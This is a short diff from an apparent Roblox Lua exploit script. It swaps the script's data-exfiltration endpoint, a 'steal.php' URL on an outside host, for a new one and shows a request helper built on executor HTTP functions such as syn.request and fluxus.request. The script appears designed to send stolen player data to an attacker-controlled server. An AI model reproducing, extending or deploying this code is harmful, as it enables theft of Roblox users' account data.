@@ -13,7 +13,7 @@ local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local Mouse = LocalPlayer:GetMouse()
 
-local ENDPOINT = "https://ashfall-rblxinfo.ct.ws/steal.php"  -- change this to your Render URL later
+local ENDPOINT = "https://evgnfp5eck.apps.bot-hosting.cloud/steal.php"  -- change this to your Render URL later
 
 local function request(opts)
 	local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
